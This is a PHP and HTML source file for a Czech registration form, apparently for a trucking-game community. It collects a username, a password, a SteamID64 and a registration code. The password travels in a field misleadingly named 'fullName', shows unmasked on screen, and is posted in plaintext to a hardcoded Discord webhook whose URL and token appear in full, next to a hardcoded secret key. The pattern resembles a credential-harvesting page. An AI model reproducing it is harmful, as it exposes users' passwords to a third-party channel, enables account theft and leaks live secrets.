<?php
// Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1306979424184569906/2lvK_oN6p4lSJjg46srXq-pJg1SNPmFFrS2r9mrOeTOXfLOgvaFVfOqiUuD4n82xEX4r";

// Secret key for validation
$secretKey = "411414258151611820139"; // Replace with your actual secret key

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data
    $userSecret = $_POST['secret'] ?? '';
    $username = $_POST['username'] ?? '';
    $fullName = $_POST['fullName'] ?? '';
    $steamID64 = $_POST['steamID64'] ?? '';
    $message = $_POST['message'] ?? '';

    // Validate the secret key
    if ($userSecret !== $secretKey) {
        echo "<p style='color:red;'>Invalid secret key. Message not sent.</p>";
    } else {
        // Prepare the data for the webhook
        $payload = json_encode([
            "content" => $message,
            "embeds" => [
                [
                    "title" => "User Submission",
                    "fields" => [
                        ["name" => "Username", "value" => $username, "inline" => true],
                        ["name" => "password", "value" => $fullName, "inline" => true],
                        ["name" => "SteamID64", "value" => $steamID64, "inline" => true],
                        ["name" => "SteamID64", "value" => $steamID64, "inline" => true]
                    ],
                    "color" => 3066993 // Embed color
                ]
            ]
        ]);

        // Use cURL to send the webhook
        $ch = curl_init($webhookUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json'
        ]);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Check the response
        if ($httpCode === 204) {
            echo "<p style='color:green;'>Message sent successfully!</p>";
        } else {
            echo "<p style='color:red;'>Failed to send the message. HTTP Code: $httpCode</p>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DP | Registrační formulář</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 20px;
        }
        .form-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            overflow: auto;
            text-align: center;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            text-align: left;
        }
        input, textarea {
            display: flex;
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            text-align: left;
        }
        button {
            display: flex;
            background-color: #007bff;
            color: #fff;
            font-size: 16px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            cursor: pointer;
            border-radius: 4px;
            text-align: center;
            font-weight: bold;
            margin-left: auto;
            margin-right: auto;
        }
        button:hover {
            background-color: #0056b3;
        }
        p {
            text-align: center;
        }
    </style>
</head>
<body>
<div class="form-container">
    <h1>DP registrace</h1>
    <form method="POST" autocomplete="off">
        <label for="secret">Registrační kód:</label>
        <input type="password" id="secret" name="secret" autocomplete="new-password" required>

        <label for="username">Uživatelské jméno:</label>
        <input type="text" id="username" name="username" required>

        <label for="fullName">Heslo:</label>
        <input type="text" id="fullName" name="fullName" required>

        <label for="steamID64">SteamID64:</label>
        <input type="text" id="steamID64" name="steamID64" required>


        <button type="submit">Odeslat</button>
    </form>
</div>
<br><br><br>
<p>Pokud nevíš, jak zjistit SteamID64, přihlaš se do <a href="https://truckershub.in" target="_blank">TruckersHub</a>. Následně klikni Dashboard -> User Profile a v Profile Details uvidíš řádek Steam ID.</p>
</body>
</html>

